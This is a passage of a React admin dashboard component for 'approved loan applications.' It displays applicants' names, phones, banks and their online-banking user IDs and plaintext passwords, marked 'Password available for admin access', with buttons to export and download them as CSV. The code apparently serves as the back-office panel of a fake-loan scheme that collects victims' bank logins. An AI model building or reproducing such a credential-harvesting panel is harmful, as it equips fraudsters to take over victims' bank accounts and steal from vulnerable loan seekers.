                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>

        {/* Bank Connections Section */}
        <Card className="mb-6">
          <CardHeader>
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="flex items-center gap-2">
                  <CreditCard className="h-5 w-5" />
                  Approved Applications ({bankConnections.length})
                </CardTitle>
                <CardDescription>Approved loan applications ready for bank connection setup</CardDescription>
              </div>
              <Button variant="outline" size="sm" onClick={exportBankConnections}>
                <Download className="h-4 w-4 mr-2" />
                Export Approved Applications
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Name</TableHead>
                    <TableHead>Phone</TableHead>
                    <TableHead>Bank</TableHead>
                    <TableHead>Login Details</TableHead>
                    <TableHead>Approved Amount</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Submitted Date</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {bankConnections.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={8} className="text-center py-8 text-muted-foreground">
                        No approved applications yet. Approve leads above to see them here.
                      </TableCell>
                    </TableRow>
                  ) : (
                    bankConnections.map((connection, index) => (
                      <TableRow key={index}>
                        <TableCell className="font-medium">{connection.name}</TableCell>
                        <TableCell>{connection.phone}</TableCell>
                        <TableCell>
                          {connection.bankAccount === "Other" ? connection.customBankName : connection.bankAccount}
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            <div className="font-medium">ID: {connection.userId}</div>
                            <div className="text-muted-foreground">Pass: {connection.password || "Not provided"}</div>
                          </div>
                        </TableCell>
                        <TableCell className="font-medium text-green-600">
                          ${Number.parseInt(connection.approvedAmount).toLocaleString()}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant={connection.status.includes("pending") ? "secondary" : "default"}
                            className={
                              connection.status.includes("pending")
                                ? "bg-yellow-100 text-yellow-800"
                                : "bg-green-100 text-green-800"
                            }
                          >
                            {connection.status
                              .replace("_", " ")
                              .replace("approved pending bank setup", "Pending Bank Setup")}
                          </Badge>
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {new Date(connection.submittedAt).toLocaleDateString()}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <Dialog>
                              <DialogTrigger asChild>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => setSelectedBankConnection(connection)}
                                >
                                  <Eye className="h-4 w-4" />
                                </Button>
                              </DialogTrigger>
                              <DialogContent className="max-w-3xl">
                                <DialogHeader>
                                  <DialogTitle>Bank Connection Details</DialogTitle>
                                  <DialogDescription>
                                    Complete bank connection information for {connection.name}
                                  </DialogDescription>
                                </DialogHeader>
                                {selectedBankConnection && (
                                  <div className="grid grid-cols-2 gap-6 py-4">
                                    <div className="space-y-4">
                                      <h3 className="font-semibold text-lg border-b pb-2">Personal Information</h3>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">Full Name</Label>
                                        <p className="text-sm font-medium">{selectedBankConnection.name}</p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Phone Number
                                        </Label>
                                        <p className="text-sm">{selectedBankConnection.phone}</p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Approved Amount
                                        </Label>
                                        <p className="text-lg font-bold text-green-600">
                                          ${Number.parseInt(selectedBankConnection.approvedAmount).toLocaleString()}
                                        </p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Application Status
                                        </Label>
                                        <Badge
                                          variant={
                                            selectedBankConnection.status.includes("pending") ? "secondary" : "default"
                                          }
                                          className={
                                            selectedBankConnection.status.includes("pending")
                                              ? "bg-yellow-100 text-yellow-800 mt-1"
                                              : "bg-green-100 text-green-800 mt-1"
                                          }
                                        >
                                          {selectedBankConnection.status
                                            .replace("_", " ")
                                            .replace("approved pending bank setup", "Pending Bank Setup")}
                                        </Badge>
                                      </div>
                                    </div>

                                    <div className="space-y-4">
                                      <h3 className="font-semibold text-lg border-b pb-2">Bank Details & Login</h3>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Selected Bank
                                        </Label>
                                        <p className="text-sm font-medium">
                                          {selectedBankConnection.bankAccount === "Other"
                                            ? selectedBankConnection.customBankName
                                            : selectedBankConnection.bankAccount}
                                        </p>
                                      </div>
                                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                                        <Label className="text-sm font-medium text-blue-900 mb-2 block">
                                          🔐 Bank Login Credentials
                                        </Label>
                                        <div className="space-y-2">
                                          <div>
                                            <Label className="text-xs font-medium text-muted-foreground">
                                              User ID / Username
                                            </Label>
                                            <p className="text-sm font-mono bg-white px-2 py-1 rounded border">
                                              {selectedBankConnection.userId}
                                            </p>
                                          </div>
                                          <div>
                                            <Label className="text-xs font-medium text-muted-foreground">
                                              Password
                                            </Label>
                                            <p className="text-sm font-mono bg-white px-2 py-1 rounded border">
                                              {selectedBankConnection.password || "Not provided"}
                                            </p>
                                            {selectedBankConnection.password && (
                                              <p className="text-xs text-green-600 mt-1">
                                                ✓ Password available for admin access
                                              </p>
                                            )}
                                          </div>
                                        </div>
                                      </div>
                                    </div>

                                    <div className="col-span-2 pt-4 border-t">
                                      <h3 className="font-semibold text-lg mb-3">Submission Details</h3>
                                      <div className="grid grid-cols-2 gap-4">
                                        <div>
                                          <Label className="text-sm font-medium text-muted-foreground">
                                            Submitted At
                                          </Label>
                                          <p className="text-sm">
                                            {new Date(selectedBankConnection.submittedAt).toLocaleString()}
                                          </p>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </DialogContent>
                            </Dialog>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => downloadBankConnectionCSV(connection, index)}
                            >
                              <Download className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => deleteBankConnection(index)}
                              className="text-destructive hover:text-destructive"
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
